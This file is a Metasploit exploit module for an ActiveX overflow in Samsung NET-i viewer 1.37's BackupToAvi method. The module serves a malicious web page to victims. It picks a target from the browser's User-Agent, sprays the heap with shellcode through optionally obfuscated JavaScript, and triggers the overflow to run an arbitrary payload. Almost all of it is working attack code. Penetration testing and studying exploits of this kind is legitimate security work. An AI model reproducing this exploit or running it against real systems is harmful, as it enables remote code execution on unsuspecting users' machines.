# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Samsung NET-i viewer Multiple ActiveX BackupToAvi() Remote Overflow",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability in the CNC_Ctrl.dll ActiveX installed
        with the Samsung NET-i viewer 1.37.

        Specifically, when supplying a long string for the fname parameter to the
        BackupToAvi method, an integer overflow occurs, which leads to a posterior buffer
        overflow due to the use of memcpy with an incorrect size, resulting in remote code
        execution under the context of the user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Luigi Auriemma&#039;, # Vulnerability Discovery and PoC
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;OSVDB&#039;, &#039;81453&#039;],
          [ &#039;BID&#039;, &#039;53193&#039;],
          [ &#039;URL&#039;, &#039;http://aluigi.altervista.org/adv/netiware_1-adv.txt&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;           => 1024,
          &#039;BadChars&#039;        => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039;         => "seh",
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          # Samsung NET-i viewer 1.37
          # CNC_Ctrl.dll 1.5.1.1
          [ &#039;Automatic&#039;, {} ],
          [ &#039;IE 6 on Windows XP SP3&#039;,
            {
              &#039;Ret&#039; => 0x0c0c0c0c,
              &#039;Offset&#039; => &#039;0x800 - code.length&#039;,
            }
          ],
          [ &#039;IE 7 on Windows XP SP3&#039;,
            {
              &#039;Ret&#039; => 0x0c0c0c0c,
              &#039;Offset&#039; => &#039;0x800 - code.length&#039;,
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Apr 21 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;])
      ], self.class)
  end

  def get_target(agent)
    #If the user is already specified by the user, we&#039;ll just use that
    return target if target.name != &#039;Automatic&#039;

    if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
      return targets[1]  #IE 6 on Windows XP SP3
    elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
      return targets[2]  #IE 7 on Windows XP SP3
    else
      return nil
    end
  end


  def on_request_uri(cli, request)
    agent = request.headers[&#039;User-Agent&#039;]
    my_target = get_target(agent)

    # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
    if my_target.nil?
      print_error("Browser not supported: #{agent.to_s}")
      send_not_found(cli)
      return
    end

    print_status("Target set: #{my_target.name}")

    p = payload.encoded
    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
    js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))

    js = <<-JS
    var heap_obj = new heapLib.ie(0x20000);
    var code = unescape("#{js_code}");
    var nops = unescape("#{js_nops}");

    while (nops.length < 0x80000) nops += nops;
    var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

    while (shellcode.length < 0x40000) shellcode += shellcode;
    var block = shellcode.substring(0, (0x80000-6)/2);

    heap_obj.gc();

    for (var i=1; i < 0x200; i++) {
      heap_obj.alloc(block);
    }
    JS

    js = heaplib(js, {:noobfu => true})

    #obfuscate on demand
    if datastore[&#039;OBFUSCATE&#039;]
      js = ::Rex::Exploitation::JSObfu.new(js)
      js.obfuscate
    end

    bof = Rex::Text.to_unescape("\x0c" * 2048, Rex::Arch.endian(my_target.arch))

    html = <<-EOS
    <html>
    <head>
    <script>
    #{js}
    </script>
    </head>
    <body>
    <object id="target1" classid="CLSID:3D6F2DBA-F4E5-40A6-8725-E99BC96CC23A"></object>
    <script>
      target1.BackupToAvi(0, 0, 0, unescape("#{bof}"));
    </script>
    <body>
    </html>
    EOS

    html = html.gsub(/^\t\t/, &#039;&#039;)

    print_status("Sending html")
    send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})

  end

end



